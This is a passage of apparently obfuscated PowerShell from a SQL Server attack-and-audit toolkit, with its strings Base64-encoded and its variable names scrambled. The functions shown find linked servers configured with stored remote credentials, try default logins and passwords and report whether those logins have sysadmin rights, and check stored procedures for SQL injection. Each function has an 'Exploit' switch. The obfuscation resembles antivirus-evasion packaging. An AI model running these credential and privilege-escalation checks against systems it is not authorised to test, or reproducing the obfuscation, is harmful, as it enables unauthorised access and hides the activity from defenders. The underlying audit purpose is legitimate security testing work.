        ${______/=\/==\/===}     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGIAbABvAGcALgBuAGUAdABzAHAAaQAuAGMAbwBtAC8AaABhAGMAawBpAG4AZwAtAHMAcQBsAC0AcwBlAHIAdgBlAHIALQBzAHQAbwByAGUAZAAtAHAAcgBvAGMAZQBkAHUAcgBlAHMALQBwAGEAcgB0AC0AMwAtAHMAcQBsAGkALQBhAG4AZAAtAHUAcwBlAHIALQBpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuAA==')))
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        ${/==\/\_/\_/\_/===} = Get-SQLStoredProcedureSQLi -Instance $Instance -Username $Username -Password $Password -Credential $Credential -OnlySig
        if(${/==\/\_/\_/\_/===}.rows.count -ge 1){
            ${____/=\_/=\___/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            ${___/=\/=\_/=\_/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA=')))
            ${/==\/\_/\_/\_/===} |
            %{
                $DatabaseName = $_.DatabaseName 
                $SchemaName = $_.SchemaName
                $ProcedureName = $_.ProcedureName
                ${_/==\_/\/==\____/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAGEAdABhAGIAYQBzAGUATgBhAG0AZQAuACQAUwBjAGgAZQBtAGEATgBhAG0AZQAuACQAUAByAG8AYwBlAGQAdQByAGUATgBhAG0AZQA=')))
                ${/=\/=\_/\/\/\/\_/} =  $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAAkAHsAXwAvAD0APQBcAF8ALwBcAC8APQA9AFwAXwBfAF8AXwAvAH0AIABzAHQAbwByAGUAZAAgAHAAcgBvAGMAZQBkAHUAcgBlACAAaQBzACAAYQBmAGYAZQBjAHQAZQBkAC4A')))
                $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})        
            }
        }    
        if($Exploit){
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvACAAYQB1AHQAbwBtAGEAdABpAGMAIABlAHgAcABsAG8AaQB0AGEAdABpAG8AbgAgAG8AcAB0AGkAbwBuACAAaABhAHMAIABiAGUAZQBuACAAcAByAG8AdgBpAGQAZQBkAC4AIABVAG4AaQBuAGYAbwByAG0AZQBkACAAZQB4AHAAbABvAGkAdABhAHQAaQBvAG4AIABvAGYAIABTAFEATABpACAAYwBhAG4AIABoAGEAdgBlACAAYQAgAG4AZQBnAGEAdABpAHYAZQAgAGkAbQBwAGEAYwB0ACAAbwBuACAAcAByAG8AZAB1AGMAdABpAG8AbgAgAGUAbgB2AGkAcgBvAG4AbQBlAG4AdABzAC4A')))
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABQAG8AdABlAG4AdABpAGEAbAAgAFMAUQBMACAASQBuAGoAZQBjAHQAaQBvAG4AIAAtACAAUwBpAGcAbgBlAGQAIABiAHkAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABMAG8AZwBpAG4A')))
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}
Function Invoke-SQLAuditPrivServerLink
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAARQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABTAGUAcgB2AGUAcgAgAEwAaQBuAGsA')))
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAC4A')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABFAHgAYwBlAHMAcwBpAHYAZQAgAFAAcgBpAHYAaQBsAGUAZwBlACAALQAgAFMAZQByAHYAZQByACAATABpAG4AawAuAA==')))
            Return
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAFMAVQBDAEMARQBTAFMALgA=')))
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
        $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABMAGkAbgBrAGUAZAAgAFMAZQByAHYAZQByAA==')))
        ${__/\/\_______/==\}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAGUAIABvAHIAIABtAG8AcgBlACAAbABpAG4AawBlAGQAIABzAGUAcgB2AGUAcgBzACAAaQBzACAAcAByAGUAYwBvAG4AZgBpAGcAdQByAGUAZAAgAHcAaQB0AGgAIABhAGwAdABlAHIAbgBhAHQAaQB2AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAB3AGgAaQBjAGgAIABjAG8AdQBsAGQAIABhAGwAbABvAHcAIABhACAAbABlAGEAcwB0ACAAcAByAGkAdgBpAGwAZQBnAGUAIABsAG8AZwBpAG4AIAB0AG8AIABlAHMAYwBhAGwAYQB0AGUAIAB0AGgAZQBpAHIAIABwAHIAaQB2AGkAbABlAGcAZQBzACAAbwBuACAAYQAgAHIAZQBtAG8AdABlACAAcwBlAHIAdgBlAHIALgA=')))
        ${____/\__/===\/===}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AZgBpAGcAdQByAGUAIABTAFEATAAgAFMAZQByAHYAZQByACAAbABpAG4AawBzACAAdABvACAAYwBvAG4AbgBlAGMAdAAgAHQAbwAgAHIAZQBtAG8AdABlACAAcwBlAHIAdgBlAHIAcwAgAHUAcwBpAG4AZwAgAHQAaABlACAAbABvAGcAaQBuACcAcwAgAGMAdQByAHIAZQBuAHQAIABzAGUAYwB1AHIAaQB0AHkAIABjAG8AbgB0AGUAeAB0AC4A')))
        ${/=\_/=\_/=\_/\/=\}      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        ${_____/\/========\}    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAaQBzACAAbgBvAHQAIABlAHgAcABsAG8AaQB0ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABhAHQAIAB0AGgAaQBzACAAdABpAG0AZQAuAA==')))
        if($Username)
        {
        }
        else
        {
        }
        ${/=\/=\_/\/\/\/\_/}       = ''
        ${______/=\/==\/===}     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADkAMAA0ADcAOQAuAGEAcwBwAHgA')))
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        ${/=\/==\/=====\/=\} = Get-SQLServerLink -Verbose -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | 
        ? { $_.LocalLogin -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcwAgAFMAZQBsAGYAIABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA'))) -and ([string]$_.RemoteLoginName).Length -ge 1}
        if(${/=\/==\/=====\/=\})
        {
            ${____/=\_/=\___/=\}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            ${/=\/==\/=====\/=\} |
            % -Process {
                ${/=\/=\_/\/\/\/\_/} = 
                ${/=\/==\_/\/==\/=\} = $_.DatabaseLinkName
                ${/==\___/=\/\/\/=\} = $_.RemoteLoginName
                ${_______/=\_/\_/\_} = $_.is_data_access_enabled
                ${_____/\/========\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGEAbQBwAGwAZQAgAHEAdQBlAHIAeQA6ACAAUwBFAEwARQBDAFQAIAAqACAARgBSAE8ATQAgAE8AUABFAE4AUQBVAEUAUgBZACgAWwAkAHsALwA9AFwALwA9AD0AXABfAC8AXAAvAD0APQBcAC8APQBcAH0AXQAsACcAUwBlAGwAZQBjAHQAIAAnACcAUwBlAHIAdgBlAHIAOgAgACcAJwAgACsAIABAAEAAUwBlAHIAdgBlAHIAbgBhAG0AZQAgACsAJwAnACAAJwAnACAAKwAgACcAJwBMAG8AZwBpAG4AOgAgACcAJwAgACsAIABTAFkAUwBUAEUATQBfAFUAUwBFAFIAJwApAA==')))
                if(${/==\___/=\/\/\/=\} -and ${_______/=\_/\_/\_} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAZQA='))))
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFQAaABlACAAJAB7AC8APQBcAC8APQA9AFwAXwAvAFwALwA9AD0AXAAvAD0AXAB9ACAAbABpAG4AawBlAGQAIABzAGUAcgB2AGUAcgAgAHcAYQBzACAAZgBvAHUAbgBkACAAYwBvAG4AZgBpAGcAdQByAGUAZAAgAHcAaQB0AGgAIAB0AGgAZQAgACQAewAvAD0APQBcAF8AXwBfAC8APQBcAC8AXAAvAFwALwA9AFwAfQAgAGwAbwBnAGkAbgAuAA==')))
                    ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABTAFEATAAgAFMAZQByAHYAZQByACAAbABpAG4AawAgACQAewAvAD0AXAAvAD0APQBcAF8ALwBcAC8APQA9AFwALwA9AFwAfQAgAHcAYQBzACAAZgBvAHUAbgBkACAAYwBvAG4AZgBpAGcAdQByAGUAZAAgAHcAaQB0AGgAIAB0AGgAZQAgACQAewAvAD0APQBcAF8AXwBfAC8APQBcAC8AXAAvAFwALwA9AFwAfQAgAGwAbwBnAGkAbgAuAA==')))
                    $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
                }
            }
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAE4AbwAgAGUAeABwAGwAbwBpAHQAYQBiAGwAZQAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABsAGkAbgBrAHMAIAB3AGUAcgBlACAAZgBvAHUAbgBkAC4A')))
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABFAHgAYwBlAHMAcwBpAHYAZQAgAFAAcgBpAHYAaQBsAGUAZwBlACAALQAgAFMAZQByAHYAZQByACAATABpAG4AawA=')))
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}
Function  Invoke-SQLAuditDefaultLoginPw
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAARABlAGYAYQB1AGwAdAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABMAG8AZwBpAG4AIABQAGEAcwBzAHcAbwByAGQA')))
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
        $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGYAYQB1AGwAdAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABMAG8AZwBpAG4AIABQAGEAcwBzAHcAbwByAGQA')))
        ${__/\/\_______/==\}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB0AGEAcgBnAGUAdAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABpAG4AcwB0AGEAbgBjAGUAIABpAHMAIABjAG8AbgBmAGkAZwB1AHIAZQBkACAAdwBpAHQAaAAgAGEAIABkAGUAZgBhAHUAbAB0ACAAUwBRAEwAIABsAG8AZwBpAG4AIABhAG4AZAAgAHAAYQBzAHMAdwBvAHIAZAAgAHUAcwBlAGQAIABiAHkAIABhACAAYwBvAG0AbQBvAG4AIABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALgA=')))
        ${____/\__/===\/===}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHMAdQByAGUAIABhAGwAbAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABsAG8AZwBpAG4AcwAgAGEAcgBlACAAcgBlAHEAdQBpAHIAZQBkACAAdABvACAAdQBzAGUAIABhACAAcwB0AHIAbwBuAGcAIABwAGEAcwBzAHcAbwByAGQALgAgAEMAbwBuAHMAaQBkAGUAcgAgAGkAbgBoAGUAcgBpAHQAaQBuAGcAIAB0AGgAZQAgAE8AUwAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAbwBsAGkAYwB5AC4A')))
        ${/=\_/=\_/=\_/\/=\}      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaAA=')))
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        ${_____/\/========\}    = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBTAFEATABRAHUAZQByAHkAIAAtAFYAZQByAGIAbwBzAGUAIAAtAEkAbgBzAHQAYQBuAGMAZQAgACQASQBuAHMAdABhAG4AYwBlACAALQBRACAAIgBTAGUAbABlAGMAdAAgAEAAQABWAGUAcgBzAGkAbwBuACIAIAAtAFUAcwBlAHIAbgBhAG0AZQAgAHQAZQBzAHQAIAAtAFAAYQBzAHMAdwBvAHIAZAAgAHQAZQBzAHQALgA=')))
        ${/=\/=\_/\/\/\/\_/}       = ''
        ${______/=\/==\/===}     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBwAHcAbgB3AGkAawBpAC8AcAB3AG4AdwBpAGsAaQAuAGcAaQB0AGgAdQBiAC4AaQBvAC8AYgBsAG8AYgAvAG0AYQBzAHQAZQByAC8AdABlAGMAaAAvAGQAYgAvAG0AcwBzAHEAbAAuAG0AZAA=')))
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLServerLoginDefaultPw -Verbose -Instance $Instance 
        if(${__/\/=\/=\/\/\_/\}){
            ${____/=\_/=\___/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            ${___/=\/=\_/=\_/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
        }
        ${__/\/=\/=\/\/\_/\} | 
        % {
            ${_/=\/\/\/\_______} = $_.Computer
            ${/=\_/==\/==\_/=\/} = $_.Instance
            ${/=======\/====\__} = $_.Username
            ${/==\_/\_______/\/} = $_.Password
            ${__/\_/\___/\/\_/\} = $_.IsSysadmin
            ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGYAYQB1AGwAdAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwB1AG4AZAA6ACAAJAB7AC8APQA9AD0APQA9AD0APQBcAC8APQA9AD0APQBcAF8AXwB9ACAALwAgACQAewAvAD0APQBcAF8ALwBcAF8AXwBfAF8AXwBfAF8ALwBcAC8AfQAgACgAcwB5AHMAYQBkAG0AaQBuADoAIAAkAHsAXwBfAC8AXABfAC8AXABfAF8AXwAvAFwALwBcAF8ALwBcAH0AKQAuAA==')))
            ${_____/\/========\}    = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBTAFEATABRAHUAZQByAHkAIAAtAFYAZQByAGIAbwBzAGUAIAAtAEkAbgBzAHQAYQBuAGMAZQAgACQAewAvAD0AXABfAC8APQA9AFwALwA9AD0AXABfAC8APQBcAC8AfQAgAC0AUQAgACIAUwBlAGwAZQBjAHQAIABAAEAAVgBlAHIAcwBpAG8AbgAiACAALQBVAHMAZQByAG4AYQBtAGUAIAAkAHsALwA9AD0APQA9AD0APQA9AFwALwA9AD0APQA9AFwAXwBfAH0AIAAtAFAAYQBzAHMAdwBvAHIAZAAgACQAewAvAD0APQBcAF8ALwBcAF8AXwBfAF8AXwBfAF8ALwBcAC8AfQA=')))
            $null = ${_/=\/\_/=====\/\_}.Rows.Add(${_/=\/\/\/\_______}, ${/=\_/==\/==\_/=\/}, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})                        
        }        
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABEAGUAZgBhAHUAbAB0ACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAEwAbwBnAGkAbgAgAFAAYQBzAHMAdwBvAHIAZAA=')))
    }
    End
    {           
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}
Function Invoke-SQLAuditPrivTrustworthy
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
